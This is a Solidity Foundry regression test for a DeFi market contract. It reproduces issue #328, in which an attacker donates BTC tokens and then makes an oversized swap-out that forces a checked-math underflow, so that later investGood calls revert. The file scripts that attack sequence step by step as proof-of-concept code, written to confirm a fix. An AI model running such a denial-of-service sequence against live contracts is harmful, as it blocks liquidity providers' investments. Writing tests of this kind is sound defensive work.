// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.29;

import {BaseSetup} from "./BaseSetup.t.sol";
import {TestConfigConstants} from "./TestConfigConstants.sol";
import {S_GoodTmpState} from "../src/interfaces/I_TTSwap_Market.sol";
import {T_GoodKey, T_GoodKeyLibrary} from "../src/type/T_GoodKey.sol";
import {L_GoodConfigLibrary} from "../src/libraries/L_GoodConfig.sol";
import {
    L_TTSwapUINT256Library,
    toTTSwapUINT256
} from "../src/libraries/L_TTSwapUINT256.sol";

/// @notice #328: getInvestPower computes Q - virtualQty with checked math;
/// a max-size swap-out (enabled by a token donation) pushes Q below
/// virtualQty and every later investGood reverts Panic(0x11).
contract InvestPowerUnderflow is BaseSetup {
    using T_GoodKeyLibrary for T_GoodKey;
    using L_TTSwapUINT256Library for uint256;
    using L_GoodConfigLibrary for uint256;

    uint256 internal btcGoodId;
    uint256 internal usdtGoodId;

    address internal lp;
    address internal lp2;
    address internal attacker;

    function setUp() public override {
        BaseSetup.setUp();
        vm.warp(0);
        lp = users[1];
        lp2 = users[2];
        attacker = users[5];

        // BTC good: tiny init, then 3x leveraged invest.
        btcGoodId = _initBtcGood(lp, 500_000_000_000_000, 1_000_000);
        _setLimitPower(btcGoodId, 3);
        _setOwnerPower(btcGoodId, lp, 3);

        // USDT good: deep pool.
        usdtGoodId = _initUsdtGood(marketcreator, 10_000_000_000_000, 10_000_000_000_000_000_000);
        _markAsValueGood(usdtGoodId);
        _relaxSafeLine(btcGoodId);
        _relaxSafeLine(usdtGoodId);

        // 3x leveraged invest: virtualQty ~2e9 vs Q ~3e9 (>60% of baseline).
        _warpToFreshRunSlot();
        vm.startPrank(lp);
        deal(address(btc), lp, 2_000_000_000);
        btc.approve(address(market), type(uint256).max);
        market.investGood(
            _btcKey(),
            toTTSwapUINT256(0, 1_000_000_000),
            defaultdata,
            defaultdata,
            lp
        );
        vm.stopPrank();
    }

    function _btcKey() internal view returns (T_GoodKey memory) {
        return T_GoodKey({ercType: 1, contractAddress: address(btc), id: 0});
    }

    function _usdtKey() internal view returns (T_GoodKey memory) {
        return T_GoodKey({ercType: 1, contractAddress: address(usdt), id: 0});
    }

    function _initBtcGood(address owner, uint128 value, uint128 qty)
        internal returns (uint256 goodId)
    {
        vm.startPrank(owner);
        deal(address(btc), owner, 10 * qty);
        btc.approve(address(market), type(uint256).max);
        T_GoodKey memory key = _btcKey();
        market.initGood(key, toTTSwapUINT256(value, qty), defaultdata, owner, defaultdata);
        goodId = key.toId();
        vm.stopPrank();
    }

    function _initUsdtGood(address owner, uint128 qty, uint128 value)
        internal returns (uint256 goodId)
    {
        vm.startPrank(owner);
        usdt.mint(owner, qty / 1e6);
        usdt.approve(address(market), qty);
        T_GoodKey memory key = _usdtKey();
        market.initGood(key, toTTSwapUINT256(value, qty), defaultdata, owner, defaultdata);
        goodId = key.toId();
        vm.stopPrank();
    }

    function _markAsValueGood(uint256 goodId) internal {
        vm.prank(marketcreator);
        market.modifyGoodByAdmin(goodId, (1 << 255), marketcreator, defaultdata);
    }

    function _setLimitPower(uint256 goodId, uint256 field) internal {
        vm.startPrank(marketcreator);
        uint256 cfg = market.getGoodState(goodId).goodConfig;
        cfg = (cfg & ~(uint256(0x1f) << TestConfigConstants.LIMIT_POWER_SHIFT)) |
            (field << TestConfigConstants.LIMIT_POWER_SHIFT);
        market.modifyGoodByManager(goodId, cfg, marketcreator, defaultdata);
        vm.stopPrank();
    }

    function _setOwnerPower(uint256 goodId, address owner, uint256 field) internal {
        vm.startPrank(owner);
        uint256 cfg = market.getGoodState(goodId).goodConfig;
        cfg = (cfg & ~(uint256(0x1f) << TestConfigConstants.POWER_SHIFT)) |
            (field << TestConfigConstants.POWER_SHIFT);
        market.modifyGoodByGoodOwner(goodId, cfg, owner, defaultdata);
        vm.stopPrank();
    }

    function _goodState() internal view returns (S_GoodTmpState memory) {
        return market.getGoodState(btcGoodId);
    }

    function testInvestPower_underflowAfterMaxSwapOut() public {
        S_GoodTmpState memory st = _goodState();
        uint128 qBefore = st.currentState.amount1();
        uint128 virtualQty = st.goodConfig.amount1();
        emit log_named_uint("Q before", qBefore);
        emit log_named_uint("virtualQty", virtualQty);
        assertGt(qBefore, virtualQty, "Q must start above virtualQty");

        // Control: a small invest works before the drain.
        _warpToFreshRunSlot();
        vm.startPrank(lp2);
        deal(address(btc), lp2, 10_000_000);
        btc.approve(address(market), type(uint256).max);
        market.investGood(
            _btcKey(),
            toTTSwapUINT256(0, 1_000_000),
            defaultdata,
            defaultdata,
            lp2
        );
        vm.stopPrank();

        // Attacker donates raw BTC to the Market (raises real balance, not Q),
        // then swaps out ~1.1e9 BTC for USDT, pushing Q below virtualQty.
        _warpToFreshRunSlot();
        vm.startPrank(attacker);
        deal(address(btc), attacker, 200_000_000);
        btc.transfer(address(market), 100_000_000);
        usdt.mint(attacker, 1_000_000);
        usdt.approve(address(market), 1_000_000_000_000);
        market.payGood(
            _usdtKey(),
            _btcKey(),
            toTTSwapUINT256(1_000_000_000_000, 1_100_000_000),
            attacker,
            defaultdata,
            attacker,
            defaultdata,
            0
        );
        vm.stopPrank();

        st = _goodState();
        uint128 qAfter = st.currentState.amount1();
        uint128 virtualQtyAfter = st.goodConfig.amount1();
        emit log_named_uint("Q after", qAfter);
        emit log_named_uint("virtualQty after", virtualQtyAfter);
        assertLt(qAfter, virtualQtyAfter, "setup failed: Q not below virtualQty");

        // Post-fix: investGood must NOT revert with Panic(0x11).
        _warpToFreshRunSlot();
        vm.startPrank(lp2);
        market.investGood(
            _btcKey(),
            toTTSwapUINT256(0, 1_000_000),
            defaultdata,
            defaultdata,
            lp2
        );
        vm.stopPrank();
    }
}
